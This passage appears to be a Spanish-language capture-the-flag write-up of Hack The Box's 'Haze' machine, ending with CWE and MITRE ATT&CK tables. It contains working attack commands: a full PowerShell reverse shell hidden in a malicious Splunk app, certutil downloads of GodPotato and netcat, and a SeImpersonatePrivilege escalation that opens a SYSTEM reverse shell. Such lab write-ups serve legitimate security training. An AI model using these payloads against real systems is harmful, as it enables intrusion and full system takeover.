Reemplacé el contenido de `reverse_shell_splunk/bin/run.ps1` por un script en PowerShell que inicia una reverse shell hacia mi equipo.

```terminal
/home/kali/Documents/htb/machines/haze/exploits/reverse_shell_splunk:-$ echo '$LHOST = "10.10.16.75"; $LPORT = 443; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()' > reverse_shell_splunk/bin/run.ps1
```

Empaqueté la aplicación maliciosa con la extensión `.spl`, como espera el mecanismo de instalación de Splunk

```terminal
/home/kali/Documents/htb/machines/haze/exploits/reverse_shell_splunk:-$ tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunkreverse_shell_splunk/
reverse_shell_splunk/default/
reverse_shell_splunk/default/inputs.conf
reverse_shell_splunk/bin/
reverse_shell_splunk/bin/rev.py
reverse_shell_splunk/bin/run.bat
reverse_shell_splunk/bin/run.ps1

/home/kali/Documents/htb/machines/haze/exploits/reverse_shell_splunk:-$ mv reverse_shell_splunk.tgz reverse_shell_splunk.spl
```

Antes de realizar la carga, abrí un listener enel puerto 443 para recibir la conexión inversa.

```terminal
/home/kali/Documents/htb/machines/haze:-$ rlwrap -cAr nc -lnvp 443
    listening on [any] 443 ...
```

Desde el menú de administración de Splunk, accedí a `Apps` > `Manage Apps` y utilicé la opción `Install App From File` para cargar el archivo `reverse_shell_splunk.spl`. Una vez instalada, el cron interno de Splunk ejecutó automáticamente el payload alojado en la carpeta `bin/`, lo que generó una conexión directa hacia mi listener.

{% include embed/video.html src='assets/img/htb-writeup-haze/haze3_3.webm' types='webm' title='CVE-2025-24071 Exploitation' autoplay=true loop=true muted=true %}

```powershell
    ... connect to [10.10.14.249] from (UNKNOWN) [10.10.11.61] 64720

PS C:\Windows\system32>whoami
haze\alexander.green
```

---
## Privilege Escalation

### System Owner/User Discovery

El usuario `alexander.green` posee el privilegio `SeImpersonatePrivilege` habilitado. Este privilegio permite [abusar de un token autenticado](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html?highlight=SeImpersonatePrivilege#seimpersonateprivilege), siempre que se obtenga acceso al mismo <a href="#cwe-922" class="cwe-ref">(CWE-922)</a>.

```powershell
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

El entorno identificado desde el inicio corresponde a un sistema `Windows Server 2022`. Esto habilita el abuso del privilegio `SeImpersonatePrivilege` para escalar privilegios. En este caso, utilizé la herramienta [GodPotato](https://github.com/BeichenDream/GodPotato), diseñada para explotar servicios vulnerables que ejecutan autenticaciones NTLM y permiten el uso de tokens privilegiados en procesos impersonados.

---
### Access Token Manipulation

Descargué el binario de la herramienta y expuse los archivos necesarios a través de un servidor HTTP.

```terminal
/home/kali/Documents/Tools:-$ wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O GodPotato/GodPotato-NET4.exe
/home/kali/Documents/Tools:-$ python3 -m http.server
```

Desde la máquina comprometida, creé un directorio temporal y descargué tanto `GodPotato-NET4.exe` como `nc64.exe`, este último para establecer la reverse shell.

```powershell
PS C:\windows\Temp> mkdir Priv
PS C:\windows\Temp\Priv> certutil.exe -urlcache -split -f http://10.10.14.249:8000/GodPotato/GodPotato-NET4.exe
PS C:\Windows\Temp\Priv> certutil.exe -urlcache -split -f http://10.10.14.249:8000/NetCat/nc64.exe
```

Para validar que el exploit funciona, ejecuté GodPotato con un comando simple que imprime el usuario actual. La salida confirmó que el exploit fue exitoso, logrando lanzar un nuevo proceso como `NT AUTHORITY\SYSTEM`.

```powershell
PS C:\Windows\Temp\Priv> ./GodPotato-NET4.exe -cmd "cmd /c whoami"
```

![](assets/img/htb-writeup-haze/haze4_1.png)

Preparé un listener en mi equipo para recibir una conexión inversa.

```terminal
/home/kali/Documents/htb/machines/haze:-$ rlwrap -cAr nc -lnvp 4443
	listening on [any] 4443 ...
```

Y ejecuté nuevamente GodPotato, esta vez con el objetivo de iniciar la reverse shell hacia mi listener.

```powershell
PS C:\Windows\Temp\Priv> ./GodPotato-NET4.exe -cmd "C:\Windows\Temp\Priv\nc64.exe 10.10.14.249 4443 -e cmd.exe"
```

A los pocos segundos, se estableció la conexión entrante en el listener, esta vez bajo el contexto del usuario `NT AUTHORITY\SYSTEM`.

```powershell
	... connect to [10.10.14.249] from (UNKNOWN) [10.10.11.61] 54755

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/654/" target="_blank">Haze Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }

---
## Common Weakness

| CWE ID | Name | Description |
| :--- | :--- | :--- |
| <a id="cwe-22" href="https://cwe.mitre.org/data/definitions/22.html" target="_blank">CWE-22</a> | <a href="#path-traversal" class="vuln-ref">Path Traversal</a> | Improper limitation of a pathname to a restricted directory. |
| <a id="cwe-522" href="https://cwe.mitre.org/data/definitions/522.html" target="_blank">CWE-522</a>  | <a href="#insufficiently-protected-credentials" class="vuln-ref">Insufficiently Protected Credentials</a> | The product uses an insecure method to store authentication credentials. |
| <a id="cwe-266" href="https://cwe.mitre.org/data/definitions/266.html" target="_blank">CWE-266</a>  | <a href="#incorrect-privilege-assignment" class="vuln-ref">Incorrect Privilege Assignment</a> | The product incorrectly assigns a privilege to a particular actor. |
| <a id="cwe-922" href="https://cwe.mitre.org/data/definitions/922.html" target="_blank">CWE-922</a>  | <a href="#insecure-storage-of-sensitive-information" class="vuln-ref">Insecure Storage of Sensitive Information</a> | The product stores sensitive information without properly limiting access by unauthorized actors. |
| <a id="cwe-91" href="https://cwe.mitre.org/data/definitions/91.html" target="_blank">CWE-91</a> | <a href="#xml-injection" class="vuln-ref">XML Injection</a> | The product does not properly neutralize special elements that are used in XML |
| <a id="cwe-94" href="https://cwe.mitre.org/data/definitions/94.html" target="_blank">CWE-94</a> | <a href="#code-injection" class="vuln-ref">Code Injection</a> | The product constructs a code segment using externally-influenced input from an upstream component. |

---

## MITRE ATT&CK Matrix

| Tactics | Techniques | Sub-Techniques | ID |
| :--- | :---: | :---: | :---: |
| [**Reconnaissance**](#reconnaissance) | | | <a href="https://attack.mitre.org/tactics/TA0043/" target="_blank">TA0043</a>
| | [Active Scanning](#active-scanning) | | <a href="https://attack.mitre.org/techniques/T1595/" target="_blank">T1595</a>
| | | [Scanning IP Blocks](#active-scanning) | <a href="https://attack.mitre.org/techniques/T1595/001/" target="_blank">T1595.001</a>
| | | [Vulnerability Scanning](#active-scaning) | <a href="https://attack.mitre.org/techniques/T1595/002/" target="_blank">T1595.002</a>
| | [Gather Victim Host Information](#active-scanning) | | <a href="https://attack.mitre.org/techniques/T1592/" target="_blank">T1592</a>
| | | [Software](#active-scanning) | <a href="https://attack.mitre.org/techniques/T1592/002/" target="_blank">T1592.002</a>|
| | [Search Victim-Owned Websites](#search-victim-owned-websites) | | <a href="https://attack.mitre.org/techniques/T1594/" target="_blank">T1594</a>
| [**Initial Access**](#initial-access) | | | <a href="https://attack.mitre.org/tactics/TA0001/" target="_blank">TA0001</a>
| | [Exploit Public-Facing Application](#exploit-public-facing-application) | | <a href="https://attack.mitre.org/techniques/T1190/" target="_blank">T1190</a>
| [Credential Access](#initial-access) | | | <a href="https://attack.mitre.org/tactics/TA0006/" target="_blank">TA0006</a>
| | [Brute Force](#brute-force) | | <a href="https://attack.mitre.org/techniques/T1110/" target="_blank">T1110</a>
| | | [Password Cracking](#brute-force) | <a href="https://attack.mitre.org/techniques/T1110/002/" target="_blank">T1110.002</a>
| [Discovery](#initial-access) | | | <a href="https://attack.mitre.org/techniques/TA0007/" target="_blank">TA0007</a>
| | [Account Discovery](#account-discovery) | | <a href="https://attack.mitre.org/techniques/T1087/" target="_blank">T1087</a>
| | | [Domain Account](#account-discovery) | <a href="https://attack.mitre.org/techniques/T1087/002/" target="_blank">T1087.002</a>
| | | [Password Spraying](#account-discovery) | <a href="https://attack.mitre.org/techniques/T1110/003/" target="_blank">T1110.003</a>
| | [Permission Groups Discovery](#permission-groups-discovery) | | <a href="https://attack.mitre.org/techniques/T1069/" target="_blank">T1069</a>
| | | [Domain Groups](#account-discovery) | <a href="https://attack.mitre.org/techniques/T1069/002/" target="_blank">T1069.002</a>
| [**Lateral Movement**](#lateral-movement) | | | <a href="https://attack.mitre.org/tactics/TA0008/" target="_blank">TA0008</a>
| | [Remote Services](#remote-services) | | <a href="https://attack.mitre.org/techniques/T1021/" target="_blank">T1021</a>
| | | [Windows Remote Management](#remote-services) | <a href="https://attack.mitre.org/techniques/T1021/006/" target="_blank">T1021.006</a>
| | | [Domain Groups](#remote-services) | <a href="https://attack.mitre.org/techniques/T1069/002/" target="_blank">T1069.002</a>
| | [Domain or Tenant Policy Modification](#domain-or-tenant-policy-modification) | | <a href="https://attack.mitre.org/techniques/T1484/" target="_blank">T1484</a>
| | | [Group Policy Modification](#domain-or-tenant-policy-modification) | <a href="https://attack.mitre.org/techniques/T1484/001/" target="_blank">T1484.001</a>
| | | [Private Keys](#domain-or-tenant-policy-modification) | <a href="https://attack.mitre.org/techniques/T1552/004/" target="_blank">T1552.004</a>
| [Defense Evasion](#lateral-movement) | | | <a href="https://attack.mitre.org/tactics/TA0005/" target="_blank">TA0005</a>
| | [Use Alternate Authentication Material](#use-alternate-authentication-material) | | <a href="https://attack.mitre.org/techniques/T1550/" target="_blank">T1550</a>
| | | [Pass the Hash](#use-alternate-authentication-material) | <a href="https://attack.mitre.org/techniques/T1550/002/" target="_blank">T1550.002</a>
| | | [Domain Groups](#remote-services) | <a href="https://attack.mitre.org/techniques/T1069/002/" target="_blank">T1069.002</a>
| [Persistence](#lateral-movement) | | | <a href="https://attack.mitre.org/tactics/TA0003/" target="_blank">TA0003</a>
| | [Account Manipulation](#account-manipulation) | | <a href="https://attack.mitre.org/techniques/T1098/" target="_blank">T1098</a>
| | | [Additional Local or Domain Groups](#account-manipulation) | <a href="https://attack.mitre.org/techniques/T1098/007/" target="_blank">T1098.007</a>
| | | [Group Policy Modification](#account-manipulation) | <a href="https://attack.mitre.org/techniques/T1484/001/" target="_blank">T1484.001</a>
| | [Steal or Forge Authentication Certificates](#steal-or-forge-authentication-certificates) | | <a href="https://attack.mitre.org/techniques/T1649/" target="_blank">T1649</a>
| | [Steal or Forge Kerberos Tickets](#steal-or-forge-authentication-certificates) | | <a href="https://attack.mitre.org/techniques/T1558/" target="_blank">T1558</a>
| | | [Ccache Files](#steal-or-forge-authentication-certificates) | <a href="https://attack.mitre.org/techniques/T1558/005/" target="_blank">T1558.005</a>
| | | [Pass the Ticket](#steal-or-forge-authentication-certificates) | <a href="https://attack.mitre.org/techniques/T1550/003/" target="_blank">T1550.003</a>
| | | [Pass the Hash](#steal-or-forge-authentication-certificates) | <a href="https://attack.mitre.org/techniques/T1550/002/" target="_blank">T1550.002</a>
| | | [Windows Remote Management](#steal-or-forge-authentication-certificates) | <a href="https://attack.mitre.org/techniques/T1021/006/" target="_blank">T1021.006</a>
| | [Unsecured Credentials](#unsecured-credentials) | | <a href="https://attack.mitre.org/techniques/T1552/" target="_blank">T1552</a>
| | | [Credentials In Files](#unsecured-credentials) | <a href="https://attack.mitre.org/techniques/T1552/001/" target="_blank">T1552.001</a>
| | | [Password Cracking](#brute-force) | <a href="https://attack.mitre.org/techniques/T1110/002/" target="_blank">T1110.002</a>
| [Execution](#lateral-movement) | | | <a href="https://attack.mitre.org/tactics/TA0002/" target="_blank">TA0002</a>
| | [Command and Scripting Interpreter](#command-and-scripting-interpreter) | | <a href="https://attack.mitre.org/techniques/T1059/" target="_blank">T1059</a>
| | | [PowerShell](#command-and-scripting-interpreter) | <a href="https://attack.mitre.org/techniques/T1059/001/" target="_blank">T1059.001</a>
| [**Privilege Escalation**](#privilege-escalation) | | | <a href="https://attack.mitre.org/tactics/TA0004/" target="_blank">TA0004</a>
| | [System Owner/User Discovery](#system-owneruser-discovery) | | <a href="https://attack.mitre.org/techniques/T1033/" target="_blank">T1033</a>
| | [Access Token Manipulation](#access-token-manipulation) | | <a href="https://attack.mitre.org/techniques/T1134/" target="_blank">T1134</a>
| | | [Make and Impersonate Token](#access-token-manipulation) | <a href="https://attack.mitre.org/techniques/T1134/003/" target="_blank">T1134.003</a>


